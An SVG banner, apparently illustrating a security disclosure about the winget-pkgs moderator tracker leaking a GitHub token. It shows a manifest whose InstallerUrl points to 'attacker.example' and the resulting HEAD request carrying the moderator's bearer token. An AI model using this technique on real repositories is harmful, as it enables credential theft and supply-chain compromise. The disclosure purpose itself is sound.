<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 500" width="1200" height="500"
     role="img" aria-label="One pull request away: a manifest with an attacker-controlled InstallerUrl makes the winget-pkgs moderator tracker send the moderator's GitHub token to the attacker's server.">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0" stop-color="#0d1117"/><stop offset="1" stop-color="#171d29"/>
    </linearGradient>
    <pattern id="grid" width="40" height="40" patternUnits="userSpaceOnUse">
      <path d="M40 0H0V40" fill="none" stroke="#ffffff" stroke-opacity="0.035" stroke-width="1"/>
    </pattern>
    <radialGradient id="glow" cx="0.5" cy="0.5" r="0.5">
      <stop offset="0" stop-color="#ef4444" stop-opacity="0.30"/><stop offset="1" stop-color="#ef4444" stop-opacity="0"/>
    </radialGradient>
    <marker id="ar" viewBox="0 0 12 12" refX="9" refY="6" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M1 1 L11 6 L1 11 z" fill="#ef4444"/>
    </marker>
  </defs>

  <rect width="1200" height="500" fill="url(#bg)"/>
  <rect width="1200" height="500" fill="url(#grid)"/>
  <ellipse cx="895" cy="300" rx="290" ry="195" fill="url(#glow)"/>

  <g font-family="'Inter','Segoe UI',Helvetica,Arial,sans-serif">
    <rect x="80" y="112" width="10" height="10" fill="#ef4444"/>
    <text x="104" y="122" font-size="20" font-weight="700" letter-spacing="3.5" fill="#f87171">SUPPLY CHAIN &#183; CREDENTIAL LEAK</text>

    <text x="80" y="220" font-size="62" font-weight="800" letter-spacing="-1" fill="#e6edf3">ONE PULL REQUEST.</text>
    <text x="80" y="288" font-size="62" font-weight="800" letter-spacing="-1" fill="#e6edf3">MICROSOFT&#8217;S KEYS.</text>

    <rect x="80" y="322" width="72" height="4" rx="2" fill="#ef4444"/>

    <text x="80" y="370" font-size="27" font-weight="500" fill="#8b949e">The winget moderator token that mails itself out.</text>
    <text x="80" y="408" font-size="21" fill="#6e7a8a" font-family="'JetBrains Mono','Consolas',monospace">microsoft/winget-pkgs &#183; ManualValidationPipeline.ps1</text>
  </g>

  <g font-family="'JetBrains Mono','Consolas',monospace">
    <text x="652" y="106" font-size="15" font-weight="700" letter-spacing="1.8" fill="#8b949e" font-family="'Inter','Segoe UI',Helvetica,Arial,sans-serif">THE MANIFEST</text>

    <rect x="650" y="118" width="490" height="96" rx="12"
          fill="#131a24" stroke="#2dd4bf" stroke-width="2" stroke-opacity="0.7"/>
    <text x="674" y="147" font-size="14" font-weight="700" letter-spacing="1.6" fill="#2dd4bf" font-family="'Inter','Segoe UI',Helvetica,Arial,sans-serif">ATTACKER PR &#183; ANYONE CAN OPEN ONE</text>
    <text x="674" y="190" font-size="19" fill="#2dd4bf">InstallerUrl: https://attacker.example/</text>

    <line x1="895" y1="222" x2="895" y2="262" stroke="#ef4444" stroke-width="4" marker-end="url(#ar)"/>
    <text x="915" y="248" font-size="16" fill="#f87171" font-family="'Inter','Segoe UI',Helvetica,Arial,sans-serif">tracker runs every 30 min &#183; no human in the loop</text>

    <rect x="650" y="270" width="490" height="130" rx="12"
          fill="#0b0f16" stroke="#ef4444" stroke-width="2"/>
    <text x="674" y="299" font-size="14" font-weight="700" letter-spacing="1.6" fill="#f87171" font-family="'Inter','Segoe UI',Helvetica,Arial,sans-serif">WHAT LANDS ON THE ATTACKER&#8217;S SERVER</text>
    <text x="674" y="340" font-size="18" fill="#f87171">HEAD /payload.exe</text>
    <text x="674" y="368" font-size="18" fill="#f87171">Authorization: Bearer ghp_&#8230;moderator&#8230;</text>

    <text x="652" y="430" font-size="17" fill="#7d8797" font-family="'Inter','Segoe UI',Helvetica,Arial,sans-serif">Write access to winget-pkgs and every repo the moderator can reach</text>
  </g>
</svg>
